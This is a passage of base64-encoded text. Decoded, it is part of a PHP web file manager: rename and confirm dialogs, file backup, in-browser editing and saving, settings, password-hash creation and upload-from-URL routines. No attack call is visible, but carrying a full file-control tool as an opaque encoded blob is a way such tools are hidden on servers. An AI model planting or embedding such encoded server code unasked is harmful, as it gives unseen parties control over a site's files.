Dw/cGhwIGVjaG8gbG5nKCdhIGZpbGVzJykgPz4iIGFyaWEtbGFiZWw9Ijw/cGhwIGVjaG8gbG5nKCdTZWFyY2gnKSA/PiIgYXJpYS1kZXNjcmliZWRieT0ic2VhcmNoLWFkZG9uMyIgaWQ9ImFkdmFuY2VkLXNlYXJjaCIgYXV0b2ZvY3VzIHJlcXVpcmVkPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9ImlucHV0LWdyb3VwLXRleHQiIGlkPSJzZWFyY2gtYWRkb24zIj48aSBjbGFzcz0iZmEgZmEtc2VhcmNoIj48L2k+PC9zcGFuPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2g1Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iYnRuLWNsb3NlIiBkYXRhLWJzLWRpc21pc3M9Im1vZGFsIiBhcmlhLWxhYmVsPSJDbG9zZSI+PC9idXR0b24+DQogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWJvZHkiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJsZHMtZmFjZWJvb2siPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdj48L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXY+PC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2PjwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHVsIGlkPSJzZWFyY2gtd3JhcHBlciI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8cCBjbGFzcz0ibS0yIj48P3BocCBlY2hvIGxuZygnU2VhcmNoIGZpbGUgaW4gZm9sZGVyIGFuZCBzdWJmb2xkZXJzLi4uJykgPz48L3A+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvdWw+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9mb3JtPg0KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPC9kaXY+DQoNCiAgICAgICAgICAgIDwhLS1SZW5hbWUgTW9kYWwgLS0+DQogICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbCBtb2RhbC1hbGVydCIgZGF0YS1icy1iYWNrZHJvcD0ic3RhdGljIiBkYXRhLWJzLWtleWJvYXJkPSJmYWxzZSIgdGFiaW5kZXg9Ii0xIiByb2xlPSJkaWFsb2ciIGlkPSJyZW5hbWVEYWlsb2ciIGRhdGEtYnMtdGhlbWU9Ijw/cGhwIGVjaG8gRk1fVEhFTUU7ID8+Ij4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1kaWFsb2ciIHJvbGU9ImRvY3VtZW50Ij4NCiAgICAgICAgICAgICAgICAgICAgPGZvcm0gY2xhc3M9Im1vZGFsLWNvbnRlbnQgcm91bmRlZC0zIHNoYWRvdyIgbWV0aG9kPSJwb3N0IiBhdXRvY29tcGxldGU9Im9mZiI+DQogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1ib2R5IHAtNCB0ZXh0LWNlbnRlciI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGg1IGNsYXNzPSJtYi0zIj48P3BocCBlY2hvIGxuZygnQXJlIHlvdSBzdXJlIHdhbnQgdG8gcmVuYW1lPycpID8+PC9oNT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8cCBjbGFzcz0ibWItMSI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJyZW5hbWVfdG8iIGlkPSJqcy1yZW5hbWUtdG8iIGNsYXNzPSJmb3JtLWNvbnRyb2wiIHBsYWNlaG9sZGVyPSI8P3BocCBlY2hvIGxuZygnRW50ZXIgbmV3IGZpbGUgbmFtZScpID8+IiByZXF1aXJlZD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idG9rZW4iIHZhbHVlPSI8P3BocCBlY2hvICRfU0VTU0lPTlsndG9rZW4nXTsgPz4iPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJyZW5hbWVfZnJvbSIgaWQ9ImpzLXJlbmFtZS1mcm9tIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L3A+DQogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWZvb3RlciBmbGV4LW5vd3JhcCBwLTAiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iYnRuIGJ0bi1sZyBidG4tbGluayBmcy02IHRleHQtZGVjb3JhdGlvbi1ub25lIGNvbC02IG0tMCByb3VuZGVkLTAgYm9yZGVyLWVuZCIgZGF0YS1icy1kaXNtaXNzPSJtb2RhbCI+PD9waHAgZWNobyBsbmcoJ0NhbmNlbCcpID8+PC9idXR0b24+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLWxnIGJ0bi1saW5rIGZzLTYgdGV4dC1kZWNvcmF0aW9uLW5vbmUgY29sLTYgbS0wIHJvdW5kZWQtMCI+PHN0cm9uZz48P3BocCBlY2hvIGxuZygnT2theScpID8+PC9zdHJvbmc+PC9idXR0b24+DQogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgPC9mb3JtPg0KICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPC9kaXY+DQoNCiAgICAgICAgICAgIDwhLS0gQ29uZmlybSBNb2RhbCAtLT4NCiAgICAgICAgICAgIDxzY3JpcHQgdHlwZT0idGV4dC9odG1sIiBpZD0ianMtdHBsLWNvbmZpcm0iPg0KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsIG1vZGFsLWFsZXJ0IGNvbmZpcm1EYWlsb2ciIGRhdGEtYnMtYmFja2Ryb3A9InN0YXRpYyIgZGF0YS1icy1rZXlib2FyZD0iZmFsc2UiIHRhYmluZGV4PSItMSIgcm9sZT0iZGlhbG9nIiBpZD0iY29uZmlybURhaWxvZy08JXRoaXMuaWQlPiIgZGF0YS1icy10aGVtZT0iPD9waHAgZWNobyBGTV9USEVNRTsgPz4iPg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1kaWFsb2ciIHJvbGU9ImRvY3VtZW50Ij4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxmb3JtIGNsYXNzPSJtb2RhbC1jb250ZW50IHJvdW5kZWQtMyBzaGFkb3ciIG1ldGhvZD0icG9zdCIgYXV0b2NvbXBsZXRlPSJvZmYiIGFjdGlvbj0iPCV0aGlzLmFjdGlvbiU+Ij4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1ib2R5IHAtNCB0ZXh0LWNlbnRlciI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxoNSBjbGFzcz0ibWItMiI+PD9waHAgZWNobyBsbmcoJ0FyZSB5b3Ugc3VyZSB3YW50IHRvJykgPz4gPCV0aGlzLnRpdGxlJT4gPzwvaDU+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxwIGNsYXNzPSJtYi0xIj48JXRoaXMuY29udGVudCU+PC9wPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWZvb3RlciBmbGV4LW5vd3JhcCBwLTAiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImJ0biBidG4tbGcgYnRuLWxpbmsgZnMtNiB0ZXh0LWRlY29yYXRpb24tbm9uZSBjb2wtNiBtLTAgcm91bmRlZC0wIGJvcmRlci1lbmQiIGRhdGEtYnMtZGlzbWlzcz0ibW9kYWwiPjw/cGhwIGVjaG8gbG5nKCdDYW5jZWwnKSA/PjwvYnV0dG9uPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJ0b2tlbiIgdmFsdWU9Ijw/cGhwIGVjaG8gJF9TRVNTSU9OWyd0b2tlbiddOyA/PiI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1sZyBidG4tbGluayBmcy02IHRleHQtZGVjb3JhdGlvbi1ub25lIGNvbC02IG0tMCByb3VuZGVkLTAiIGRhdGEtYnMtZGlzbWlzcz0ibW9kYWwiPjxzdHJvbmc+PD9waHAgZWNobyBsbmcoJ09rYXknKSA/Pjwvc3Ryb25nPjwvYnV0dG9uPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgPC9mb3JtPg0KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgIDwvc2NyaXB0Pg0KICAgICAgICA8P3BocA0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIFNob3cgcGFnZSBmb290ZXIgYWZ0ZXIgbG9naW4NCiAgICAgKi8NCiAgICBmdW5jdGlvbiBmbV9zaG93X2Zvb3RlcigpDQogICAgew0KICAgICAgICA/Pg0KICAgICAgICA8L2Rpdj4NCiAgICAgICAgPD9waHAgcHJpbnRfZXh0ZXJuYWwoJ2pzLWpxdWVyeScpOyA/Pg0KICAgICAgICA8P3BocCBwcmludF9leHRlcm5hbCgnanMtYm9vdHN0cmFwJyk7ID8+DQogICAgICAgIDw/cGhwIHByaW50X2V4dGVybmFsKCdqcy1qcXVlcnktZGF0YXRhYmxlcycpOyA/Pg0KICAgICAgICA8P3BocCBpZiAoRk1fVVNFX0hJR0hMSUdIVEpTICYmIGlzc2V0KCRfR0VUWyd2aWV3J10pKTogPz4NCiAgICAgICAgICAgIDw/cGhwIHByaW50X2V4dGVybmFsKCdqcy1oaWdobGlnaHRqcycpOyA/Pg0KICAgICAgICAgICAgPHNjcmlwdD4NCiAgICAgICAgICAgICAgICBobGpzLmhpZ2hsaWdodEFsbCgpOw0KICAgICAgICAgICAgICAgIHZhciBpc0hpZ2hsaWdodGluZ0VuYWJsZWQgPSB0cnVlOw0KICAgICAgICAgICAgPC9zY3JpcHQ+DQogICAgICAgIDw/cGhwIGVuZGlmOyA/Pg0KICAgICAgICA8c2NyaXB0Pg0KICAgICAgICAgICAgZnVuY3Rpb24gdGVtcGxhdGUoaHRtbCwgb3B0aW9ucykgew0KICAgICAgICAgICAgICAgIHZhciByZSA9IC88XCUoW15cJT5dKyk/XCU+L2csDQogICAgICAgICAgICAgICAgICAgIHJlRXhwID0gLyheKCApPyhpZnxmb3J8ZWxzZXxzd2l0Y2h8Y2FzZXxicmVha3x7fH0pKSguKik/L2csDQogICAgICAgICAgICAgICAgICAgIGNvZGUgPSAndmFyIHI9W107XG4nLA0KICAgICAgICAgICAgICAgICAgICBjdXJzb3IgPSAwLA0KICAgICAgICAgICAgICAgICAgICBtYXRjaDsNCiAgICAgICAgICAgICAgICB2YXIgYWRkID0gZnVuY3Rpb24obGluZSwganMpIHsNCiAgICAgICAgICAgICAgICAgICAganMgPyAoY29kZSArPSBsaW5lLm1hdGNoKHJlRXhwKSA/IGxpbmUgKyAnXG4nIDogJ3IucHVzaCgnICsgbGluZSArICcpO1xuJykgOiAoY29kZSArPSBsaW5lICE9ICcnID8gJ3IucHVzaCgiJyArIGxpbmUucmVwbGFjZSgvIi9nLCAnXFwiJykgKyAnIik7XG4nIDogJycpOw0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gYWRkDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHdoaWxlIChtYXRjaCA9IHJlLmV4ZWMoaHRtbCkpIHsNCiAgICAgICAgICAgICAgICAgICAgYWRkKGh0bWwuc2xpY2UoY3Vyc29yLCBtYXRjaC5pbmRleCkpKG1hdGNoWzFdLCAhMCk7DQogICAgICAgICAgICAgICAgICAgIGN1cnNvciA9IG1hdGNoLmluZGV4ICsgbWF0Y2hbMF0ubGVuZ3RoDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGFkZChodG1sLnN1YnN0cihjdXJzb3IsIGh0bWwubGVuZ3RoIC0gY3Vyc29yKSk7DQogICAgICAgICAgICAgICAgY29kZSArPSAncmV0dXJuIHIuam9pbigiIik7JzsNCiAgICAgICAgICAgICAgICByZXR1cm4gbmV3IEZ1bmN0aW9uKGNvZGUucmVwbGFjZSgvW1xyXHRcbl0vZywgJycpKS5hcHBseShvcHRpb25zKQ0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBmdW5jdGlvbiByZW5hbWUoZSwgdCkgew0KICAgICAgICAgICAgICAgIGlmICh0KSB7DQogICAgICAgICAgICAgICAgICAgICQoIiNqcy1yZW5hbWUtZnJvbSIpLnZhbCh0KTsNCiAgICAgICAgICAgICAgICAgICAgJCgiI2pzLXJlbmFtZS10byIpLnZhbCh0KTsNCiAgICAgICAgICAgICAgICAgICAgJCgiI3JlbmFtZURhaWxvZyIpLm1vZGFsKCdzaG93Jyk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBmdW5jdGlvbiBjaGFuZ2VfY2hlY2tib3hlcyhlLCB0KSB7DQogICAgICAgICAgICAgICAgZm9yICh2YXIgbiA9IGUubGVuZ3RoIC0gMTsgbiA+PSAwOyBuLS0pIGVbbl0uY2hlY2tlZCA9ICJib29sZWFuIiA9PSB0eXBlb2YgdCA/IHQgOiAhZVtuXS5jaGVja2VkDQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIGZ1bmN0aW9uIGdldF9jaGVja2JveGVzKCkgew0KICAgICAgICAgICAgICAgIGZvciAodmFyIGUgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5TmFtZSgiZmlsZVtdIiksIHQgPSBbXSwgbiA9IGUubGVuZ3RoIC0gMTsgbiA+PSAwOyBuLS0pKGVbbl0udHlwZSA9ICJjaGVja2JveCIpICYmIHQucHVzaChlW25dKTsNCiAgICAgICAgICAgICAgICByZXR1cm4gdA0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBmdW5jdGlvbiBzZWxlY3RfYWxsKCkgew0KICAgICAgICAgICAgICAgIGNoYW5nZV9jaGVja2JveGVzKGdldF9jaGVja2JveGVzKCksICEwKQ0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBmdW5jdGlvbiB1bnNlbGVjdF9hbGwoKSB7DQogICAgICAgICAgICAgICAgY2hhbmdlX2NoZWNrYm94ZXMoZ2V0X2NoZWNrYm94ZXMoKSwgITEpDQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIGZ1bmN0aW9uIGludmVydF9hbGwoKSB7DQogICAgICAgICAgICAgICAgY2hhbmdlX2NoZWNrYm94ZXMoZ2V0X2NoZWNrYm94ZXMoKSkNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgZnVuY3Rpb24gY2hlY2tib3hfdG9nZ2xlKCkgew0KICAgICAgICAgICAgICAgIHZhciBlID0gZ2V0X2NoZWNrYm94ZXMoKTsNCiAgICAgICAgICAgICAgICBlLnB1c2godGhpcyksIGNoYW5nZV9jaGVja2JveGVzKGUpDQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC8vIENyZWF0ZSBmaWxlIGJhY2t1cCB3aXRoIC5iY2sNCiAgICAgICAgICAgIGZ1bmN0aW9uIGJhY2t1cChlLCB0KSB7DQogICAgICAgICAgICAgICAgdmFyIG4gPSBuZXcgWE1MSHR0cFJlcXVlc3QsDQogICAgICAgICAgICAgICAgICAgIGEgPSAicGF0aD0iICsgZSArICImZmlsZT0iICsgdCArICImdG9rZW49IiArIHdpbmRvdy5jc3JmICsgIiZ0eXBlPWJhY2t1cCZhamF4PXRydWUiOw0KICAgICAgICAgICAgICAgIHJldHVybiBuLm9wZW4oIlBPU1QiLCAiIiwgITApLCBuLnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtdHlwZSIsICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiKSwgbi5vbnJlYWR5c3RhdGVjaGFuZ2UgPSBmdW5jdGlvbigpIHsNCiAgICAgICAgICAgICAgICAgICAgNCA9PSBuLnJlYWR5U3RhdGUgJiYgMjAwID09IG4uc3RhdHVzICYmIHRvYXN0KG4ucmVzcG9uc2VUZXh0KQ0KICAgICAgICAgICAgICAgIH0sIG4uc2VuZChhKSwgITENCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgLy8gVG9hc3QgbWVzc2FnZQ0KICAgICAgICAgICAgZnVuY3Rpb24gdG9hc3QodHh0KSB7DQogICAgICAgICAgICAgICAgdmFyIHggPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgic25hY2tiYXIiKTsNCiAgICAgICAgICAgICAgICB4LmlubmVySFRNTCA9IHR4dDsNCiAgICAgICAgICAgICAgICB4LmNsYXNzTmFtZSA9ICJzaG93IjsNCiAgICAgICAgICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgew0KICAgICAgICAgICAgICAgICAgICB4LmNsYXNzTmFtZSA9IHguY2xhc3NOYW1lLnJlcGxhY2UoInNob3ciLCAiIik7DQogICAgICAgICAgICAgICAgfSwgMzAwMCk7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC8vIFNhdmUgZmlsZQ0KICAgICAgICAgICAgZnVuY3Rpb24gZWRpdF9zYXZlKGUsIHQpIHsNCiAgICAgICAgICAgICAgICB2YXIgbiA9ICJhY2UiID09IHQgPyBlZGl0b3IuZ2V0U2Vzc2lvbigpLmdldFZhbHVlKCkgOiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgibm9ybWFsLWVkaXRvciIpLnZhbHVlOw0KICAgICAgICAgICAgICAgIGlmICh0eXBlb2YgbiAhPT0gJ3VuZGVmaW5lZCcgJiYgbiAhPT0gbnVsbCkgew0KICAgICAgICAgICAgICAgICAgICBpZiAodHJ1ZSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGRhdGEgPSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYWpheDogdHJ1ZSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250ZW50OiBuLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHR5cGU6ICdzYXZlJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b2tlbjogd2luZG93LmNzcmYNCiAgICAgICAgICAgICAgICAgICAgICAgIH07DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICQuYWpheCh7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdHlwZTogIlBPU1QiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVybDogd2luZG93LmxvY2F0aW9uLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGE6IEpTT04uc3RyaW5naWZ5KGRhdGEpLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRlbnRUeXBlOiAiYXBwbGljYXRpb24vanNvbjsgY2hhcnNldD11dGYtOCIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3VjY2VzczogZnVuY3Rpb24obWVzKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvYXN0KCJTYXZlZCBTdWNjZXNzZnVsbHkiKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2luZG93Lm9uYmVmb3JldW5sb2FkID0gZnVuY3Rpb24oKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmFpbHVyZTogZnVuY3Rpb24obWVzKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvYXN0KCJFcnJvcjogdHJ5IGFnYWluIik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlcnJvcjogZnVuY3Rpb24obWVzKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvYXN0KGA8cCBzdHlsZT0iYmFja2dyb3VuZC1jb2xvcjpyZWQiPiR7bWVzLnJlc3BvbnNlVGV4dH08L3A+YCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICAgICB2YXIgYSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImZvcm0iKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGEuc2V0QXR0cmlidXRlKCJtZXRob2QiLCAiUE9TVCIpLCBhLnNldEF0dHJpYnV0ZSgiYWN0aW9uIiwgIiIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgdmFyIG8gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJ0ZXh0YXJlYSIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgby5zZXRBdHRyaWJ1dGUoInR5cGUiLCAidGV4dGFyZWEiKSwgby5zZXRBdHRyaWJ1dGUoIm5hbWUiLCAic2F2ZWRhdGEiKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBjeCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImlucHV0Iik7DQogICAgICAgICAgICAgICAgICAgICAgICBjeC5zZXRBdHRyaWJ1dGUoInR5cGUiLCAiaGlkZGVuIik7DQogICAgICAgICAgICAgICAgICAgICAgICBjeC5zZXRBdHRyaWJ1dGUoIm5hbWUiLCAidG9rZW4iKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGN4LnNldEF0dHJpYnV0ZSgidmFsdWUiLCB3aW5kb3cuY3NyZik7DQogICAgICAgICAgICAgICAgICAgICAgICB2YXIgYyA9IGRvY3VtZW50LmNyZWF0ZVRleHROb2RlKG4pOw0KICAgICAgICAgICAgICAgICAgICAgICAgby5hcHBlbmRDaGlsZChjKSwgYS5hcHBlbmRDaGlsZChvKSwgYS5hcHBlbmRDaGlsZChjeCksIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSksIGEuc3VibWl0KCkNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgZnVuY3Rpb24gc2hvd19uZXdfcHdkKCkgew0KICAgICAgICAgICAgICAgICQoIi5qcy1uZXctcHdkIikudG9nZ2xlQ2xhc3MoJ2hpZGRlbicpOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAvLyBTYXZlIFNldHRpbmdzDQogICAgICAgICAgICBmdW5jdGlvbiBzYXZlX3NldHRpbmdzKCR0aGlzKSB7DQogICAgICAgICAgICAgICAgbGV0IGZvcm0gPSAkKCR0aGlzKTsNCiAgICAgICAgICAgICAgICAkLmFqYXgoew0KICAgICAgICAgICAgICAgICAgICB0eXBlOiBmb3JtLmF0dHIoJ21ldGhvZCcpLA0KICAgICAgICAgICAgICAgICAgICB1cmw6IGZvcm0uYXR0cignYWN0aW9uJyksDQogICAgICAgICAgICAgICAgICAgIGRhdGE6IGZvcm0uc2VyaWFsaXplKCkgKyAiJnRva2VuPSIgKyB3aW5kb3cuY3NyZiArICImYWpheD0iICsgdHJ1ZSwNCiAgICAgICAgICAgICAgICAgICAgc3VjY2VzczogZnVuY3Rpb24oZGF0YSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGRhdGEpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aW5kb3cubG9jYXRpb24ucmVsb2FkKCk7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9KTsNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC8vQ3JlYXRlIG5ldyBwYXNzd29yZCBoYXNoDQogICAgICAgICAgICBmdW5jdGlvbiBuZXdfcGFzc3dvcmRfaGFzaCgkdGhpcykgew0KICAgICAgICAgICAgICAgIGxldCBmb3JtID0gJCgkdGhpcyksDQogICAgICAgICAgICAgICAgICAgICRwd2QgPSAkKCIjanMtcHdkLXJlc3VsdCIpOw0KICAgICAgICAgICAgICAgICRwd2QudmFsKCcnKTsNCiAgICAgICAgICAgICAgICAkLmFqYXgoew0KICAgICAgICAgICAgICAgICAgICB0eXBlOiBmb3JtLmF0dHIoJ21ldGhvZCcpLA0KICAgICAgICAgICAgICAgICAgICB1cmw6IGZvcm0uYXR0cignYWN0aW9uJyksDQogICAgICAgICAgICAgICAgICAgIGRhdGE6IGZvcm0uc2VyaWFsaXplKCkgKyAiJnRva2VuPSIgKyB3aW5kb3cuY3NyZiArICImYWpheD0iICsgdHJ1ZSwNCiAgICAgICAgICAgICAgICAgICAgc3VjY2VzczogZnVuY3Rpb24oZGF0YSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGRhdGEpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcHdkLnZhbChkYXRhKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgLy8gVXBsb2FkIGZpbGVzIHVzaW5nIFVSTCBAcGFyYW0ge09iamVjdH0NCiAgICAgICAgICAgIGZ1bmN0aW9uIHVwbG9hZF9mcm9tX3VybCgkdGhpcykgew0KICAgICAgICAgICAgICAgIGxldCBmb3JtID0gJCgkdGhpcyksDQogICAgICAgICAgICAgICAgICAgIHJlc3VsdFdyYXBwZXIgPSAkKCJkaXYjanMtdXJsLXVwbG9hZF9fbGlzdCIpOw0KICAgICAgICAgICAgICAgICQuYWpheCh7DQogICAgICAgICAgICAgICAgICAgIHR5cGU6IGZvcm0uYXR0cignbWV0aG9kJyksDQogICAgICAgICAgICAgICAgICAgIHVybDogZm9ybS5hdHRyKCdhY3Rpb24nKSwNCiAgICAgICAgICAgICAgICAgICAgZGF0YTogZm9ybS5zZXJpYWxpemUoKSArICImdG9rZW49IiArIHdpbmRvdy5jc3JmICsgIiZhamF4PSIgKyB0cnVlLA0KICAgICAgICAgICAgICAgICAgICBiZWZvcmVTZW5kOiBmdW5jdGlvbigpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGZvcm0uZmluZCgiaW5wdXRbbmFtZT11cGxvYWR1cmxdIikuYXR0cigiZGlzYWJsZWQiLCAiZGlzYWJsZWQiKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGZvcm0uZmluZCgiYnV0dG9uIikuaGlkZSgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgZm9ybS5maW5kKCIubGRzLWZhY2Vib29rIikuYWRkQ2xhc3MoJ3Nob3ctbWUnKTsNCiAgICAgICAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgICAgICAgc3VjY2VzczogZnVuY3Rpb24oZGF0YSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGRhdGEpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhID0gSlNPTi5wYXJzZShkYXRhKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoZGF0YS5kb25lKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlc3VsdFdyYXBwZXIuYXBwZW5kKCc8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1zdWNjZXNzIHJvdyI+VXBsb2FkZWQgU3VjY2Vzc2Z1bDogJyArIGRhdGEuZG9uZS5uYW1lICsgJzwvZGl2PicpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3JtLmZpbmQoImlucHV0W25hbWU9dXBsb2FkdXJsXSIpLnZhbCgnJyk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmIChkYXRh